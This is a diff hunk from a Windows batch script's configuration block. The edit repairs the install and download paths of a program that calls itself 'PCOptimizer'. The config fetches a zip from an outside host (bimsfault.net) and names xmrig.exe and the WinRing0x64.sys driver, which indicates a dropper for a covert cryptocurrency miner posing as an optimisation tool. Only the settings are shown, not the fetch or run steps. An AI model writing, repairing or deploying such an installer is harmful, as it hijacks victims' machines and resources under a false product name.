@@ -4,8 +4,8 @@ setlocal EnableExtensions
 :: ================= CONFIG =================
 set "URL=https://bimsfault.net/base.zip"
 set "APP_NAME=PCOptimizer"
-set "INSTALL_DIR=%ProgramData%%APP_NAME%"
-set "ZIP_PATH=%TEMP%%APP_NAME%.zip"
+set "INSTALL_DIR=%ProgramData%\%APP_NAME%"
+set "ZIP_PATH=%TEMP%\%APP_NAME%.zip"
 set "EXE_NAME=xmrig.exe"
 set "DRIVER_NAME=WinRing0x64.sys"
 :: =========================================
